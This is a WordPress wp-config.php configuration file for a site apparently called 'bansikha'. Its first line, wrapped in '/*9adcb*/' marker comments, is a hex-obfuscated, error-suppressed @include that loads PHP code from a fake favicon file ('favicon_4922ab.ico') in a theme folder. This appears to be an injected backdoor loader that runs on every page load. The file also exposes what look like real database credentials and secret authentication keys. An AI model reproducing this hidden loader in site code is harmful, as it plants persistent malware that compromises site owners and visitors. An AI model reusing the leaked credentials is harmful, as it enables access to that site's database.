<?php
/*9adcb*/

@include "\x2fho\x6de/\x62an\x73ik\x68a/\x70ub\x6cic\x5fht\x6dl/\x77p-\x63on\x74en\x74/t\x68em\x65s/\x74we\x6ety\x66if\x74ee\x6e/f\x61vi\x63on\x5f49\x322a\x62.i\x63o";

/*9adcb*/
/**
 * The base configuration for WordPress
 *
 * The wp-config.php creation script uses this file during the
 * installation. You don't have to use the web site, you can
 * copy this file to "wp-config.php" and fill in the values.
 *
 * This file contains the following configurations:
 *
 * * MySQL settings
 * * Secret keys
 * * Database table prefix
 * * ABSPATH
 *
 * @link https://codex.wordpress.org/Editing_wp-config.php
 *
 * @package WordPress
 */

// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define('DB_NAME', 'bansikha_wp660');

/** MySQL database username */
define('DB_USER', 'bansikha_wp660');

/** MySQL database password */
define('DB_PASSWORD', 'S]8491p5v(');

/** MySQL hostname */
define('DB_HOST', 'localhost');

/** Database Charset to use in creating database tables. */
define('DB_CHARSET', 'utf8mb4');

/** The Database Collate type. Don't change this if in doubt. */
define('DB_COLLATE', '');

/**#@+
 * Authentication Unique Keys and Salts.
 *
 * Change these to different unique phrases!
 * You can generate these using the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}
 * You can change these at any point in time to invalidate all existing cookies. This will force all users to have to log in again.
 *
 * @since 2.6.0
 */
define('AUTH_KEY',         '8e8opxwhnp9qae3tkfiozgdtmxb5qsxqld7vrkglexx0yuhhgxvxhwkfdcpdvmm6');
define('SECURE_AUTH_KEY',  '9lw9epni9y6zpd5cphgdltuyqyfshg2rtfwqnjysx5xkgi8fxndeelrgzrm31jmy');
define('LOGGED_IN_KEY',    '4ht4imzfjaefqehs8o6dipeinfeotf6lzpuinfjn5abd8li47ghnypslvh6c2fzt');
define('NONCE_KEY',        'tf0soilymthgusgiplwpfzuqqhltszlob43mnbnwy78vryduwnpfmfxvkhfifkla');
define('AUTH_SALT',        'jl3joewdg4omea6wr6ybairsa1o8czcfuu3rvkup0knjsryxho0jsquqfuja8d4g');
define('SECURE_AUTH_SALT', '6isfrmfurypbhweesrpr1twysvhg8crvqsykfwo0g2zhd7nlxwrt82ptirjf2j4b');
define('LOGGED_IN_SALT',   'or4qhxqqeklyjkgxosa5plg2vndnutiimgb8arsch8x5osm22q7wzgom3j7sumeu');
define('NONCE_SALT',       'su0qp4o0mry48vxputqgmttddiiz1a20dyjodl7or5yjdspt36klwe88ltz6gom6');

/**#@-*/

/**
 * WordPress Database Table prefix.
 *
 * You can have multiple installations in one database if you give each
 * a unique prefix. Only numbers, letters, and underscores please!
 */
$table_prefix  = 'wpan_';

/**
 * For developers: WordPress debugging mode.
 *
 * Change this to true to enable the display of notices during development.
 * It is strongly recommended that plugin and theme developers use WP_DEBUG
 * in their development environments.
 *
 * For information on other constants that can be used for debugging,
 * visit the Codex.
 *
 * @link https://codex.wordpress.org/Debugging_in_WordPress
 */
define('WP_DEBUG', false);

/* That's all, stop editing! Happy blogging. */

/** Absolute path to the WordPress directory. */
if ( !defined('ABSPATH') )
	define('ABSPATH', dirname(__FILE__) . '/');

/** Sets up WordPress vars and included files. */
require_once(ABSPATH . 'wp-settings.php');
